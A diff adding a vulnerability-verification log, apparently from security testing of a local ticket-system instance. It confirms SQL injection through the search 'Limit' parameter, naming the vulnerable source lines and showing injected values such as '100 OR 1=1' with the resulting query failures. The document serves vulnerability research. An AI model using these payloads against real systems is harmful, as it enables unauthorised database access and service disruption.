@@ -1,0 +1,11 @@
+==========================================================================
+VULN-017: Request Limit -> raw SQL LIMIT (SQL injection)
+Target: http://localhost:25114
+[INFO] DB.pm:732 $SQL .= " LIMIT $Limit" with no int(); TicketSearch.pm:345 forwards raw
+==========================================================================
+[SETUP] web service GTCR_ed91ae2f (exposes Ticket::TicketSearch, POST /Ticket/Search)
+[STEP] GI TicketSearch with a valid integer Limit vs an injected 'N OR 1=1'
+[PROOF] Limit=100 -> 78 tickets;  Limit='100 OR 1=1' -> 0 tickets (injection breaks the query; a sanitising impl would return rows)
+[PROOF] DB::Prepare(Limit='424242 OR 7=7') MySQL error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right synta
+[OK] exploit confirmed — the request Limit is interpolated verbatim into the SQL LIMIT clause: over HTTP the GI TicketSearch returned 78 tickets for Limit=100 but 0 for '100 OR 1=1' (query broken), and at the sink DB::Prepare emitted '... LIMIT 424242 OR 7=7' which MySQL rejected citing 'OR 7=7' — genuine SQLi (MySQL8 constrains impact to error/DoS; full extraction on Postgres/Oracle/MSSQL).
+==> VULN-017: CONFIRMED — the request Limit is interpolated verbatim into the SQL LIMIT clause: over HTTP the GI TicketSearch returned 78 tickets for Limit=100 but 0 for '100 OR 1=1' (query broken), and at the sink DB::Prepare emitted '... LIMIT 424242 OR 7=7' which MySQL rejected citing 'OR 7=7' — genuine SQLi (MySQL8 constrains impact to error/DoS; full extraction on Postgres/Oracle/MSSQL).
